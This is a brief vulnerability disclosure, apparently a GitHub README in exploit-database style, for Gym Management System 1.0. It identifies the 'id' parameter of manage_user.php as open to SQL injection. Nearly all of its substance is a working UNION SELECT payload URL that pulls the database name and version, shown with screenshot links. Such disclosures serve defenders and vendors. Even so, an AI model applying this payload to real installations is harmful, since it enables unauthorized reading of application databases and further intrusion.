# Gym-Management-System  
* Exploit Title: Gym Management System 1.0 - 'id' SQL Injection  
*  Vendor Homepage: https://www.sourcecodester.com/php/14541/gym-management-system-using-phpmysqli-source-code.html  
* Software Link: https://www.sourcecodester.com/download-code?nid=14541&title=Gym+Management+System+using+PHP%2FMySQLi+with+Source+Code  
* Version: 1.0  
 
* parameter Vulnerable: id  
* Vulnerable file: manage_user.php  
![iamge](https://github.com/BigTiger2020/Gym-Management-System/blob/main/06.png)  
* payload: http://ip/gym/manage_user.php?id=-1+UNION+ALL+SELECT+NULL,GROUP_CONCAT(database(),version()),NULL,NULL,NULL--  
![iamge](https://github.com/BigTiger2020/Gym-Management-System/blob/main/05.png)   
